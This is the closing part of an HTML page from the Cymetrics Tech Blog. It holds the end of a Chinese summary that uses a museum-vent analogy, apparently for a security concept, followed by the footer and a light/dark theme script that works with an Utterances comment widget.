而且門上了鎖不讓訪客進入，但有趣的是博物館裡的每一個房間都有通風口，只要知道房間位置，就可以透過其他房間的通風口前往 Staff Only..."}</script></article></main><footer><div class=copyright>© 2021 Cymetrics Tech Blog</div><a href=https://tech-blog.cymetrics.io/feed/feed.xml id=rss><img alt="rss feed" height=18 src=/img/rss-feed.svg width=18></a></footer><script>// light/dark theme switch
      const toggleEl = document.querySelector('#color-scheme-toggle')
      const bodyEl = document.querySelector('body');
      const DARK = 'dark';
      const LIGHT = 'light';
      const currentTheme = localStorage.getItem("theme") ||
            (window.matchMedia('(prefers-color-scheme: dark)').matches ? DARK : LIGHT);
      setTheme(currentTheme)

      toggleEl.addEventListener("click", handleToggleEvent)

      function handleToggleEvent(){
        const isDark = bodyEl.classList.toggle(DARK);
        const theme = isDark ? DARK : LIGHT;
        setTheme(theme)
        localStorage.setItem('theme', theme);
      }
      function setTheme(theme){
        if (theme === DARK) {
          setUtterancesTheme(DARK)
          bodyEl.classList.add(DARK);
          toggleEl.src = toggleEl.src.replace(DARK, LIGHT);
        }else{
          setUtterancesTheme(LIGHT)
          toggleEl.src = toggleEl.src.replace(LIGHT, DARK);
        }
      }

      var isUtterancesLoaded = false
      window.addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') {
          return;
        }
        isUtterancesLoaded = true
      });

      function setUtterancesTheme(theme) {
        let utterancesIframe = document.querySelector('.utterances iframe')
        if (!isUtterancesLoaded) {
          return requestAnimationFrame(() => setUtterancesTheme(theme))
        }

        utterancesIframe.contentWindow.postMessage({
          type: 'set-theme',
          theme: theme === DARK ? 'github-dark-orange' : 'github-light'
        }, 'https://utteranc.es');
      }</script></body></html>